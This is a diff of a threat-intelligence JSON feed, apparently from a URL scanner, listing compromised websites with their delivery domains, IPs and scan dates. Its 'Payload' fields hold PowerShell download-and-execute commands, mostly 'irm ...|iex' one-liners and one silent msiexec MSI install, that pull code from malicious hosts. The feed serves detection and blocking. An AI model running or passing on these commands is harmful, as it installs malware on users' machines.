@@ -1,5 +1,58 @@
 [
   {
+    "UrlDomain": "www.erikarenealarsen.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.217.93"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/058ff855ad8e7e30",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29912691",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/058ff855ad8e7e30'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/058ff855ad8e7e30"
+    ],
+    "ReportId": "cmwi2o0iz0wl70omljttx6np4",
+    "ScannedAt": "2026-11-15T16:51:55.497000+00:00"
+  },
+  {
+    "UrlDomain": "diamondqualitycontractors.com",
+    "DeliveryUrl": [
+      "framesavecloudjs.beer",
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "160.153.0.228"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/6a72ba2774c19eaf",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/6a72ba2774c19eaf'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/6a72ba2774c19eaf"
+    ],
+    "ReportId": "cmwi2ffgu0wgc0omlvztx57aj",
+    "ScannedAt": "2026-11-15T16:45:14.945000+00:00"
+  },
+  {
     "UrlDomain": "aipas.fit",
     "DeliveryUrl": [
       "biboiboboorl.org"
@@ -3192,97 +3245,5 @@
     ],
     "ReportId": "cmwdt7rly04sw0oml797g7obw",
     "ScannedAt": "2026-11-12T17:16:16.187000+00:00"
-  },
-  {
-    "UrlDomain": "www.jarthursmith.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "blessedwirrow.org",
-      "apiexplorerzone.com",
-      "simplecopseholding.com",
-      "javascriptbasics.com",
-      "digdonger.org",
-      "parserapiprocess.com",
-      "fetchapiutility.com",
-      "newgoodfoodmarket.com",
-      "taskrunnersrvmod.com",
-      "cronapiworkersvc.com"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "198.71.232.7"
-    ],
-    "Related": [
-      {
-        "Value": "https://blessedwirrow.org/qlzvfjfnsjfacbqafa8yg",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://apiexplorerzone.com/ckxdxshtxehivuhjdk6snoknbgnm3qpocizoao8cjwm",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://simplecopseholding.com/jwctaonomvvewlrkcujn6pf-aopgxjy",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://javascriptbasics.com/ql47k60lp5cvuktygfwp1xbnu0bhaocvl70kid1kbbd",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://digdonger.org/87cblkdce4fkkwg3pse6smsugo3vtjtu61o5dv8jon1",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://parserapiprocess.com/flr1uzpkaflwiwyrrq4ncoew3ssq87ztg-t7vlpnz4u",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://fetchapiutility.com/zrrvdxj3zu7awavigi8unoo0x5s7wrpgxb44xmfwqbz5-t",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://newgoodfoodmarket.com/x5itbyecdrzi2yp1ob1ke046ds2izeg49excr8alhq9",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://taskrunnersrvmod.com/ykutz6vjmcpqhclzicjjk6ds1gqtzcvwirjqtk-fvtxuivrcfj",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://cronapiworkersvc.com/enmt0kv4oil779uv5atyhsznue-cevzct1bnix4",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://browse-cloud.codes/5d69fe5eb757ed96",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/5d69fe5eb757ed96'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/5d69fe5eb757ed96"
-    ],
-    "ReportId": "cmwdsgbm604qt0oml3owfisgv",
-    "ScannedAt": "2026-11-12T16:54:55.751000+00:00"
-  },
-  {
-    "UrlDomain": "quaideazamcollege.com",
-    "DeliveryUrl": [
-      "cranjis.com",
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "77.37.53.189"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwds9z2204os0omlpy5c0lbi",
-    "ScannedAt": "2026-11-12T16:49:59.425000+00:00"
   }
 ]
